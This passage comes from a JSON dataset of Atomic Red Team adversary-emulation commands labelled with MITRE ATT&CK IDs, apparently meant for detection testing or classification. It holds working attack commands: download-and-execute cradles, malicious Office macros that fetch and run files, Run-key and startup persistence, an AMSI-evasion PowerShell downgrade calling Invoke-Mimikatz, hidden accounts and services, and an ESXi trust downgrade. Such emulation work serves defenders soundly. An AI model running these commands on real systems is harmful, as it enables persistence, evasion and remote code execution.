        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"$(\"$env:temp\\art1204.bat\")`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c $(\"$env:temp\\art1204.bat\") `\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct Word\n",
        "Description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1204.002",
        "Shell": "powershell"
    },
    {
        "ID": 1062,
        "Command": "$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"\n$fname1 = \"$env:TEMP\\procexp.exe\"\nif (Test-Path $fname) {\n  Remove-Item $fname\n  Remove-Item $fname1\n}\n\n$xlApp = New-Object -COMObject \"Excel.Application\"\n$xlApp.Visible = $True\n$xlApp.DisplayAlerts = $False\n$xlBook = $xlApp.Workbooks.Add()\n$sheet = $xlBook.Excel4MacroSheets.Add()\n\nif (\"$env:Username\" -ne \"\") {\n  $sheet.Cells.Item(1,1) = \"$env:Username\"\n} else {\n  $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\n}\n\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\n$sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\", 3)\"\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"https://live.sysinternals.com/procexp.exe`\"`\"`\")\"\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\"`\", 2`\")\"\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\")\"\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\")\"\n$sheet.Cells.Item(23,1) = \"=HALT()\"\n$sheet.Cells.Item(1,1).Name = \"runme\"\n$xlApp.Run(\"runme\")\n$xlApp.Quit()\n\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\n[System.GC]::Collect()\n[System.GC]::WaitForPendingFinalizers()\n\nRemove-Variable xlBook\nRemove-Variable xlApp\n",
        "Description": "This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a \"malicious\"\nVBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.\n\nA note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If\nyou'd like to utilize the \"=GET.WORKSPACE(26)\" method, that many maldoc authors use, you will need to ensure that the User Name associated\nwith Excel matches that of the local system. This username can be found under Files -> Options -> Username\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1204.002",
        "Shell": "powershell"
    },
    {
        "ID": 1063,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"\n",
        "Description": "This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local\nwebserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver\nand pull down the script and execute it. By default the payload will execute calc.exe on the system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1204.002",
        "Shell": "powershell"
    },
    {
        "ID": 1064,
        "Command": "Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe\n& \"$env:TEMP/PotentiallyUnwanted.exe\"\n",
        "Description": "The Potentially Unwanted Applications (PUA) protection feature in antivirus software can identify and block PUAs from downloading and installing on endpoints in your network. These applications are not considered viruses, malware, or other types of threats, but might perform actions on endpoints that adversely affect their performance or use. This file is similar to EICAR test virus file, but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1204.002",
        "Shell": "powershell"
    },
    {
        "ID": 1065,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macroCode = Get-Content \"PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt\" -Raw\n$URL = \"\" + \"/\" + \"\"\n$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt\"\nInvoke-MalDoc -macroCode $macroCode -officeProduct \"Word\"\n",
        "Description": "This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.\nRequired input agruments are c2_domain and file_name\nExecution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nExample for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder\nExample input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1204.002",
        "Shell": "powershell"
    },
    {
        "ID": 1066,
        "Command": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"\n$file1 = \"$env:Temp\\test10.lnk\"\nStart-Process $file1\nStart-Sleep -s 10\ntaskkill /IM a.exe /F\n",
        "Description": "This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1204.002",
        "Shell": "powershell"
    },
    {
        "ID": 1067,
        "Command": "Cd \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\"\nNew-ItemProperty -Path Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security -Name \"VBAWarnings\" -Value \"1\" -PropertyType DWORD -Force | Out-Null\n& '.\\Excel 2016.lnk' \"PathToAtomicsFolder\\T1204.002\\bin\\mirrorblast_emulation.xlsm\"",
        "Description": "Emulates the JS -> MSI chain of the MirrorBlast T505 campaign by executing an xlsm file designed. \nRequires the 32 bit version of Office to run. [MirrorBlast Campaign Analysis](https://blog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companies)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1204.002",
        "Shell": "powershell"
    },
    {
        "ID": 1068,
        "Command": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n\\tWrite-Host \"64-bit Office\"\n\\t$excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\")\n}\nelse{\n  Write-Host \"32-bit Office\"\n  $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")\n}\n",
        "Description": "Loads an XLL file using the excel add-ins library.\nThis causes excel to launch Notepad.exe as a child process. This atomic test does not include persistent code execution as you would typically see when this is implemented in malware.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1137.006",
        "Shell": "powershell"
    },
    {
        "ID": 1069,
        "Command": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n\\tWrite-Host \"64-bit Office\"\n\\tCopy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\n$ver = $excelApp.version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\nRemove-Item $ExcelRegPath -ErrorAction Ignore\nNew-Item -type Directory $ExcelRegPath | Out-Null\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\n$excelApp.Quit()\nStart-Process \"Excel\"\n",
        "Description": "Creates an Excel Add-in file (XLL) and sets a registry key to make it run automatically when Excel is started\nThe sample XLL provided launches the notepad as a proof-of-concept for persistent execution from Office.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1137.006",
        "Shell": "powershell"
    },
    {
        "ID": 1070,
        "Command": "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"\\t\\t\n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n",
        "Description": "Creates a Word Add-in file (WLL) which runs automatically when Word is started\nThe sample WLL provided launches the notepad as a proof-of-concept for persistent execution from Office.\nSuccessfully tested on 32-bit Office 2016. Not successful from microsoft 365 version of Office. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1137.006",
        "Shell": "powershell"
    },
    {
        "ID": 1071,
        "Command": "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\" \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\"\\t\\t\nStart-Process \"Excel\"\n",
        "Description": "Creates an Excel VBA Add-in file (XLAM) which runs automatically when Excel is started\nThe sample XLAM provided launches the notepad as a proof-of-concept for persistent execution from Office.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1137.006",
        "Shell": "powershell"
    },
    {
        "ID": 1072,
        "Command": "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\" \"$env:APPDATA\\Microsoft\\Addins\\notepad.ppam\"\n$ver = (New-Object -COMObject \"PowerPoint.Application\").version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\"\nNew-Item -type Directory $ExcelRegPath -Force | Out-Null\nNew-ItemProperty $ExcelRegPath \"Autoload\" -value \"1\" -propertyType DWORD  | Out-Null\nNew-ItemProperty $ExcelRegPath \"Path\" -value \"notepad.ppam\" -propertyType string | Out-Null\nStop-Process -Name \"PowerPnt\" -ErrorAction Ignore\nStart-Process \"PowerPnt\"\n",
        "Description": "Creates a PowerPoint VBA Add-in file (PPAM) which runs automatically when PowerPoint is started\nThe sample PPA provided launches the notepad as a proof-of-concept for persistent execution from Office.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1137.006",
        "Shell": "powershell"
    },
    {
        "ID": 1073,
        "Command": "echo [InternetShortcut] > %temp%\\T1547.009_modified_shortcut.url\necho URL=C:\\windows\\system32\\calc.exe >> %temp%\\T1547.009_modified_shortcut.url\n%temp%\\T1547.009_modified_shortcut.url\n",
        "Description": "This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;\ngci -path \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern \"exe\" | FL.\nUpon execution, calc.exe will be launched.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.009",
        "Shell": "command_prompt"
    },
    {
        "ID": 1074,
        "Command": "$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1547.009.\";\n$ShortCut.Save()\n\n$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1547.009.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1547.009.\";\n$ShortCut.Save()\n",
        "Description": "LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nto view the new shortcut.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.009",
        "Shell": "powershell"
    },
    {
        "ID": 1075,
        "Command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server atomic.local -User root -Password pass\n(Get-EsxCli -VMHost atomic.local -V2).software.acceptance.set.Invoke(@{level = \"CommunitySupported\"})\nDisconnect-VIServer -Confirm:$false\n",
        "Description": "An adversary can change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria.This can be accomplished via PowerCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.\n[Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.010",
        "Shell": "powershell"
    },
    {
        "ID": 1076,
        "Command": "echo \"\" | \"PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\" \"atomic.local\" -ssh  -l \"root\" -pw \"pass\" -m \"PathToAtomicsFolder\\T1562.010\\src\\esx_community_supported.txt\"\n",
        "Description": "An adversary will change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria via ESXCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.\n[Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.010",
        "Shell": "command_prompt"
    },
    {
        "ID": 1077,
        "Command": "PowerShell -version 2 -command 'Invoke-Mimikatz'",
        "Description": "Executes outdated PowerShell Version 2 which does not support security features like AMSI. By default the atomic will attempt to execute the cmdlet Invoke-Mimikatz whether it exists or not, as this cmdlet will be blocked by AMSI when active.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.010",
        "Shell": "powershell"
    },
    {
        "ID": 1078,
        "Command": "$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\")\n$macro = $macro -replace \"aREPLACEMEa\", \"PathToAtomicsFolder\\T1564\\bin\\extractme.bin\"\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap\n",
        "Description": "This module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564",
        "Shell": "powershell"
    },
    {
        "ID": 1079,
        "Command": "net user $ ATOMIC123! /add /active:yes",
        "Description": "Creating a user with a username containing \"$\"",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564",
        "Shell": "command_prompt"
    },
    {
        "ID": 1080,
        "Command": "New-LocalUser -Name \"Administrator \" -NoPassword",
        "Description": "Creating a user with a username containing with a space on the end",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564",
        "Shell": "powershell"
    },
    {
        "ID": 1081,
        "Command": "sc.exe create AtomicService binPath= \"C:\\Windows\\System32\\calc.exe\"\nsc sdset AtomicService \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\n",
        "Description": "The following technique utilizes sc.exe and sdset to change the security descriptor of a service and \"hide\" it from Get-Service or sc query.\n\nUpon successful execution, sc.exe creates a new service changes the security descriptor.\n\nhttps://twitter.com/Alh4zr3d/status/1580925761996828672\nhttps://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564",
        "Shell": "command_prompt"
    },
    {
        "ID": 1082,
        "Command": "cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\nircmd.exe\" win child class \"Shell_TrayWnd\" hide class \"TrayClockWClass\"\n",
        "Description": "NirCmd is used by threat actors to execute commands, which can include recon and privilege escalation via running commands via the SYSTEM account\nSee https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564",
        "Shell": "powershell"
    },
    {
        "ID": 1083,
        "Command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"\n",
        "Description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be via stdout. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1084,
        "Command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\Path\\AtomicRedTeam.dll\"\n",
        "Description": "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1085,
        "Command": "$RunOnceKey = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nset-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'\n",
        "Description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "powershell"
    },
    {
        "ID": 1086,
        "Command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n",
        "Description": "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "powershell"
    },
    {
        "ID": 1087,
        "Command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n",
        "Description": "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "powershell"
    },
    {
        "ID": 1088,
        "Command": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n",
        "Description": "bat files can be placed in and executed from the startup folder to maintain persistance\n\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "powershell"
    },
    {
        "ID": 1089,
        "Command": "$Target = \"C:\\Windows\\System32\\calc.exe\"\n$ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"\n$WScriptShell = New-Object -ComObject WScript.Shell\n$Create = $WScriptShell.CreateShortcut($ShortcutLocation)\n$Create.TargetPath = $Target\n$Create.Save()\\t  ",
        "Description": "Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. ",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "powershell"
    },
    {
        "ID": 1090,
        "Command": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f",
        "Description": "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)\nUser have to clic on the recycle bin to lauch the payload (here calc)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1091,
        "Command": "$RunKey = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nSet-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\"\n",
        "Description": "This Atomic will create a registry key called socks5_powershell for persistance access\nhttps://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "powershell"
    },
    {
        "ID": 1092,
        "Command": "New-Item -ItemType Directory -path \"$env:TMP\\atomictest\\\"\nCopy-Item -path \"C:\\Windows\\System32\\calc.exe\" -destination \"$env:TMP\\atomictest\\\"\nSet-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"$env:TMP\\atomictest\\\"\n",
        "Description": "This test will modify the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders -V \"Common Startup\" \nvalue to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "powershell"
    },
    {
        "ID": 1093,
        "Command": "New-Item -ItemType Directory -path \"$env:TMP\\atomictest\\\"\nCopy-Item -path \"C:\\Windows\\System32\\calc.exe\" -destination \"$env:TMP\\atomictest\\\"\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"$env:TMP\\atomictest\\\"\n",
        "Description": "This test will modify the HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders  -V \"Startup\" value \nto point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "powershell"
    },
    {
        "ID": 1094,
        "Command": "if (!(Test-Path -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){\n  New-Item -ItemType Key -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n}\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"atomictest\" -Value \"C:\\Windows\\System32\\calc.exe\"\n",
        "Description": "This test will create a new value under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run to launch calc.exe on boot. \n*Requires reboot\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.001",
        "Shell": "powershell"
    },
    {
        "ID": 1095,
